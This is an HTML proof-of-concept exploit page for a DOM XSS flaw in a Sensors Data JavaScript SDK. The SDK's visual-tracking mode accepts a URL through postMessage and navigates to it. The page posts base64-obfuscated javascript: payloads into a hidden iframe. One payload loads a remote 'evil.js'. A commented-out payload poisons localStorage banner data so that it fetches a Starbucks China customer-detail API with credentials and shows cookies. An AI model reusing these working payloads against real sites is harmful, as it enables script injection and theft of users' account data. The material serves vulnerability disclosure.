<html>
<head>
	<title>DOM XSS Vulnerablity POC</title>
</head>
<!-- 由于 URL 中含有 sa-visual-mode=true 参数，JS SDK 会检查当前是否处于可视化埋点模式，具体做法是：
1. 设置一个 message 监听器，接受来自外界的消息,如果收到了一个 source: 'sa-fe', 'type': 'v-track-mode' 的消息，如果收到了期待的消息，且当前页面 URL 中含有 sa-visual-mode=true 参数,则使用 window.location.href = userURL. 这里的 userURL 是来自外部的消息。
2. 向外层网页（在本例中是当前页面）发送一个 postMessage 消息，期待收到一个消息
-->
<iframe src="https://jssdk.debugbox.sensorsdata.cn/js/ck/xssdemo.html?sa-visual-mode=true/#/" id="iframepage" onload="postmessage_iframe_exploit()" width=0 height=0></iframe>
<script>
function postmessage_iframe_exploit() {
	iframe=document.getElementById("iframepage");
	//iframe.contentWindow.postMessage(JSON.parse('{"source":"sa-fe","type":"v-track-mode","data":{"isVtrack":"1","userURL":"JavaScrIpt:eval(atob(`ZXZhbChsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgiQkFOTkVSX0NBQ0hFX0hPTUVQQUdFIixgW3siaWQiOiIxYzlkYTZjYS02MzhkLTQ1M2ItYmU2ZC1jZjJjOTM4OWZlYjAiLCJ0aXRsZSI6IjExMTExMTExIiwidHlwZSI6ImhvbWVwYWdlLWJhbm5lciIsInJlZGlyZWN0VXJsIjoiaHR0cHM6Ly93d3cuc3RhcmJ1Y2tzLmNvbS5jbi9tZW51LyIsIm9wZW5pbmdJbldlYlZpZXciOmZhbHNlLCJ0ZXJtc0FuZENvbmRpdGlvbnMiOm51bGwsInByaW9yaXR5IjowLCJleHRyYSI6eyJoNV9pbWFnZV96aCI6Imh0dHBzOi8vYXJ0d29yay5zdGFyYnVja3MuY29tLmNuL2Jhbm5lcnMtaG9tZXBhZ2UtYmFubmVyL21haW5fZWE0M2UxYmUtNDdlZi00YWIxLTlkNTYtMjUwYzFlYjQ1YjAxLmpwZyIsImg1X2ltYWdlX2VuIjoiaHR0cHM6Ly9hcnR3b3JrLnN0YXJidWNrcy5jb20uY24vYmFubmVycy1ob21lcGFnZS1iYW5uZXIvbWFpbl8zYWQ5NDY0Yi0xZmRmLTQ3OTctYmIwMS1hNWYzYzhmYWRhYTAuanBnIn0sInVwZGF0ZWRBdCI6IjIwMjEtMDEtMDRUMTI6NTE6MzkuNjgyWiIsInN0YXJ0RGF0ZSI6IjIwMjEtMDEtMDVUMDI6MDA6MDAuMDAwWiIsImVuZERhdGUiOiIyMDIxLTEyLTMwVDE2OjAwOjAwLjAwMFoiLCJzYURhdGEiOm51bGwsImltYWdlX3poIjoiaHR0cHM6Ly9hcnR3b3JrLnN0YXJidWNrcy5jb20uY24vYmFubmVycy1ob21lcGFnZS1iYW5uZXIvbWFpbl8wN2NmYWFiNC02OTkxLTQ4MDEtODYxMy0wODRhNjhhODAyZDYuanBnIiwiaW1hZ2VfZW4iOiJodHRwczovL2FydHdvcmsuc3RhcmJ1Y2tzLmNvbS5jbi9iYW5uZXJzLWhvbWVwYWdlLWJhbm5lci9tYWluXzBkM2Q0MDkzLWJlMmItNDExNi1hNGNlLTU3ZTBiNzBkNmIwMS5qcGcifSx7ImlkIjoiYzAxZTdhNjMtMmIyZS00NDVkLWFhMjUtYWVkMjExNTE1NmVlIiwidGl0bGUiOiIyMjIyIiwidHlwZSI6ImhvbWVwYWdlLWJhbm5lciIsInJlZGlyZWN0VXJsIjoiaHR0cHM6Ly93d3cuc3RhcmJ1Y2tzLmNvbS5jbi9hY2NvdW50L3N0YXJidWNrcy1yZXdhcmRzIiwib3BlbmluZ0luV2ViVmlldyI6ZmFsc2UsInRlcm1zQW5kQ29uZGl0aW9ucyI6bnVsbCwicHJpb3JpdHkiOjIsImV4dHJhIjp7Img1X2ltYWdlX3poIjoiaHR0cHM6Ly9hcnR3b3JrLnN0YXJidWNrcy5jb20uY24vYmFubmVycy1ob21lcGFnZS1iYW5uZXIvbWFpbl83ZmM0Zjc2MC02OTI2LTRlZWItOTMwNC0wNjU4MWRkOWE3MzcuanBnIiwiaDVfaW1hZ2VfZW4iOiJodHRwczovL2FydHdvcmsuc3RhcmJ1Y2tzLmNvbS5jbi9iYW5uZXJzLWhvbWVwYWdlLWJhbm5lci9tYWluXzNiOTZhMmQ3LWZhOWEtNDc4OS05ZjM5LTlhMjFkMDRmNDRiNC5qcGcifSwidXBkYXRlZEF0IjoiMjAyMS0wMS0wNFQxMjo0NDoxNy45NTRaIiwic3RhcnREYXRlIjoiMjAyMC0wOS0wN1QxNTowMDowMC4wMDBaIiwiZW5kRGF0ZSI6IjIwMjEtMTItMzBUMTY6MDA6MDAuMDAwWiIsInNhRGF0YSI6bnVsbCwiaW1hZ2VfemgiOiJodHRwczovL2FydHdvcmsuc3RhcmJ1Y2tzLmNvbS5jbi9iYW5uZXJzLWhvbWVwYWdlLWJhbm5lci9tYWluXzYxYmFiZTEzLWQ1NjktNDc2Yi04YmQ2LWU3NTA2ODk0MzMxOC5qcGcnIG9ubG9hZD1ldmFsKGF0b2IoJ1puVnVZM1JwYjI0Z1oyVjBWR1Y0ZENoMWNtd3BJSHNLSUNCMllYSWdjbVZ4ZFdWemRDQTlJRzVsZHlCWVRVeElkSFJ3VW1WeGRXVnpkQ2dwT3dvZ0lISmxjWFZsYzNRdWIzQmxiaWdpUjBWVUlpd2dkWEpzS1RzS0lDQnlaWEYxWlhOMExtOXVjbVZoWkhsemRHRjBaV05vWVc1blpTQTlJR1oxYm1OMGFXOXVJQ2dwSUhzS0lDQWdJR2xtSUNoeVpYRjFaWE4wTG5KbFlXUjVVM1JoZEdVZ1BUMDlJRFFnSmlZZ2NtVnhkV1Z6ZEM1emRHRjBkWE1nUFQwOUlESXdNQ2tnZXdvZ0lDQWdJQ0FnSUdGc1pYSjBLSEpsY1hWbGMzUXVjbVZ6Y0c5dWMyVlVaWGgwS1RzS0lDQWdJSDBLSUNCOU93b2dJSEpsY1hWbGMzUXVkMmwwYUVOeVpXUmxiblJwWVd4eklEMGdkSEoxWlRzZ0lBb2dJSEpsY1hWbGMzUXVjMlZ1WkNodWRXeHNLVHNLZlFwblpYUlVaWGgwS0NKb2RIUndjem92TDNCeWIyWnBiR1V1YzNSaGNtSjFZMnR6TG1OdmJTNWpiaTloY0drdlEzVnpkRzl0WlhKekwyUmxkR0ZwYkNJcE93PT0nKSk7YWxlcnQoZG9jdW1lbnQuY29va2llKTtjPSciLCJpbWFnZV9lbiI6Imh0dHBzOi8vYXJ0d29yay5zdGFyYnVja3MuY29tLmNuL2Jhbm5lcnMtaG9tZXBhZ2UtYmFubmVyL21haW5fYjRjMzk3OTAtZWRkZC00YTI4LTlmYmItYTQ4MTY1MDk1NzUyLmpwZycgb25sb2FkPWV2YWwoYXRvYignWm5WdVkzUnBiMjRnWjJWMFZHVjRkQ2gxY213cElIc0tJQ0IyWVhJZ2NtVnhkV1Z6ZENBOUlHNWxkeUJZVFV4SWRIUndVbVZ4ZFdWemRDZ3BPd29nSUhKbGNYVmxjM1F1YjNCbGJpZ2lSMFZVSWl3Z2RYSnNLVHNLSUNCeVpYRjFaWE4wTG05dWNtVmhaSGx6ZEdGMFpXTm9ZVzVuWlNBOUlHWjFibU4wYVc5dUlDZ3BJSHNLSUNBZ0lHbG1JQ2h5WlhGMVpYTjBMbkpsWVdSNVUzUmhkR1VnUFQwOUlEUWdKaVlnY21WeGRXVnpkQzV6ZEdGMGRYTWdQVDA5SURJd01Da2dld29nSUNBZ0lDQWdJR0ZzWlhKMEtISmxjWFZsYzNRdWNtVnpjRzl1YzJWVVpYaDBLVHNLSUNBZ0lIMEtJQ0I5T3dvZ0lISmxjWFZsYzNRdWQybDBhRU55WldSbGJuUnBZV3h6SUQwZ2RISjFaVHNnSUFvZ0lISmxjWFZsYzNRdWMyVnVaQ2h1ZFd4c0tUc0tmUXBuWlhSVVpYaDBLQ0pvZEhSd2N6b3ZMM0J5YjJacGJHVXVjM1JoY21KMVkydHpMbU52YlM1amJpOWhjR2t2UTNWemRHOXRaWEp6TDJSbGRHRnBiQ0lwT3c9PScpKTthbGVydChkb2N1bWVudC5jb29raWUpO2M9JyJ9XWApKTs=`))"}}'),'http://localhost');
	const str = 'alert("xss 5:" + document.title); var script = document.createElement("script"); script.src= "http://localhost/sa-sdk-javascript/demo/evil.js"; document.body.appendChild(script);';
	const encodedData = btoa(str); // encode a string
	iframe.contentWindow.postMessage(JSON.parse('{"source":"sa-fe","type":"v-track-mode","data":{"isVtrack":"1","userURL":"JavaScrIpt:eval(atob(`'+encodedData+'`))"}}'),'https://jssdk.debugbox.sensorsdata.cn');
}
setTimeout("window.location.href='https://jssdk.debugbox.sensorsdata.cn/js/ck/xssdemo.html'", 6000);
</script>
<body>
	Please wating 6s to redirect......
</body>
</html>
